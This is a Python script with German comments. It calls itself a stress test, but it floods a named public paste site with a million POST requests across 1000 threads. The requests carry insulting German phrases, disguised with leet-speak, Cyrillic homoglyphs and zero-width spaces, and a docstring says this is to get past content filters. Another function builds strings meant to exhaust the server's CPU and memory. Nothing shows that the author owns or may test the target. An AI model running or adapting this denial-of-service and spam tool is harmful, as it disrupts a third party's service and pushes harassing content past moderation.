import requests
import threading
import random
import string
import time
import json

# --- KONFIGURATION ---
TARGET_URL = "https://paste.cutecatgirls.cc/create/paste" 

NUM_THREADS = 1000

# Anzahl der Anfragen, die jeder Thread senden soll.
REQUESTS_PER_THREAD = 1000

# Länge der zufälligen Zeichenketten. Höhere Werte erzeugen mehr Last.
# 20000 erzeugt einen Payload von ca. 20KB pro Anfrage.
CONTENT_LENGTH = 1
# --- ENDE DER KONFIGURATION ---


# Zähler für erfolgreiche und fehlgeschlagene Anfragen (thread-sicher)
success_count = 0
error_count = 0
lock = threading.Lock()

# Die Sätze, die in den zufälligen Inhalt eingefügt werden sollen
PHRASES = ["du kannst nichts", "du bist ein opfer", "du bist ein einsames kind"]

# Mapping für die Verschleierung von Zeichen (Leet-Speak und Homoglyphen)
OBFUSCATION_MAP = {
    'a': ['4', '@', 'а'],  # 'а' ist kyrillisch
    'b': ['8', 'б'],      # 'б' ist kyrillisch
    'e': ['3', '€', 'е'],  # 'е' ist kyrillisch
    'i': ['1', '!', '|'],
    'o': ['0', 'о'],      # 'о' ist kyrillisch
    's': ['5', '$', '§'],
    't': ['7', '+'],
    'c': ['(', 'с'],      # 'с' ist kyrillisch
    'k': ['к'],          # 'к' ist kyrillisch
}

def obfuscate_text(text):
    """
    Verschleiert einen Text, um Filter zu umgehen.
    Verwendet eine zufällige Mischung aus Leet-Speak, Homoglyphen und
    unsichtbaren Zeichen.
    """
    result = []
    for char in text.lower():
        if char in OBFUSCATION_MAP and random.random() < 0.8:
            result.append(random.choice(OBFUSCATION_MAP[char]))
        else:
            result.append(char)
        
        if random.random() < 0.5:
            result.append('\u200b') # Zero-width space

    return "".join(result)

def generate_heavy_string(length):
    """
    Generiert eine sehr lange und komplexe Zeichenkette, um Server-Ressourcen
    (CPU, RAM) beim Parsen und Verarbeiten zu belasten.
    """
    # Großer Zeichensatz mit vielen Sonderzeichen und Unicode-Zeichen (z.B. Emojis)
    char_pool = string.ascii_letters + string.digits + string.punctuation + "äöüÄÖÜß" + "".join(chr(i) for i in range(0x1F600, 0x1F64F))
    
    result_parts = []
    current_length = 0

    while current_length < length:
        action = random.choice(['phrase', 'random_block', 'long_word'])

        # Füge eine verschleierte Phrase hinzu
        if action == 'phrase' and current_length + 100 < length:
            phrase = random.choice(PHRASES)
            obfuscated_phrase = obfuscate_text(phrase)
            result_parts.append(obfuscated_phrase)
            current_length += len(obfuscated_phrase)
        
        # Füge ein sehr langes Wort ohne Leerzeichen hinzu
        elif action == 'long_word' and current_length + 300 < length:
            long_word_len = random.randint(150, 300)
            long_word = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(long_word_len))
            result_parts.append(long_word)
            current_length += len(long_word)
        
        # Füge einen Block zufälliger, komplexer Zeichen hinzu
        else:
            remaining = length - current_length
            if remaining > 0:
                # *** KORREKTUR START ***
                # Wenn genügend Platz vorhanden ist, erstelle einen Block von 50-200 Zeichen.
                if remaining >= 50:
                    random_len = random.randint(50, min(remaining, 200))
                # Andernfalls fülle einfach den verbleibenden Platz auf.
                else:
                    random_len = remaining
                # *** KORREKTUR ENDE ***
                
                random_chars = ''.join(random.choice(char_pool) for _ in range(random_len))
                result_parts.append(random_chars)
                current_length += len(random_chars)

    # Kombiniere die Teile und kürze/fülle auf die exakte Ziellänge
    final_string = " ".join(result_parts)
    return (final_string + ''.join(random.choices(char_pool, k=length)))[:length]


def stress_worker():
    """
    Diese Funktion wird von jedem Thread ausgeführt. Sie sendet wiederholt
    POST-Anfragen an die Ziel-URL und gibt den Status jeder Anfrage aus.
    """
    global success_count, error_count
    
    with requests.Session() as session:
        for i in range(REQUESTS_PER_THREAD):
            log_prefix = f"Thread-{threading.get_ident() % 100:02d} | Req-{i+1:03d}"
            
            try:
                random_content = generate_heavy_string(CONTENT_LENGTH)
                payload = {
                    "content": random_content,
                    "password": None,
                    "maxViews": None
                }

                response = session.post(TARGET_URL, json=payload, timeout=20) # Timeout erhöht

                if response.ok:
                    with lock:
                        success_count += 1
                    try:
                        resp_url = response.json().get('url', 'N/A')
                    except json.JSONDecodeError:
                        resp_url = 'Invalid JSON'
                    print(f"{log_prefix} | SUCCESS | Status: {response.status_code} | URL: {resp_url}")
                else:
                    with lock:
                        error_count += 1
                    print(f"{log_prefix} | FAILED  | Status: {response.status_code} | Body: {response.text[:50]}")
            
            except requests.exceptions.RequestException as e:
                with lock:
                    error_count += 1
                print(f"{log_prefix} | ERROR   | Exception: {e.__class__.__name__}")

def main():
    """
    Hauptfunktion zum Starten und Verwalten des Stresstests.
    """
    print("--- Stresstest wird gestartet (mit sehr großen & komplexen Anfragen) ---")
    print(f"Ziel-URL: {TARGET_URL}")
    print(f"Anzahl der Threads: {NUM_THREADS}")
    print(f"Anfragen pro Thread: {REQUESTS_PER_THREAD}")
    print(f"Länge pro Anfrage: {CONTENT_LENGTH} Zeichen")
    total_requests = NUM_THREADS * REQUESTS_PER_THREAD
    print(f"Gesamte Anfragen: {total_requests}")
    print("--------------------------------------------------------------------")

    threads = []
    start_time = time.time()

    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=stress_worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    duration = end_time - start_time

    print("\n--- Stresstest beendet ---")
    print(f"Dauer: {duration:.2f} Sekunden")
    print(f"Erfolgreiche Anfragen: {success_count}")
    print(f"Fehlgeschlagene Anfragen: {error_count}")
    if duration > 0:
        rps = success_count / duration
        print(f"Anfragen pro Sekunde (RPS): {rps:.2f}")
    print("--------------------------")


if __name__ == "__main__":
    # Um dieses Skript auszuführen, müssen Sie die `requests`-Bibliothek installieren:
    # pip install requests
    main()

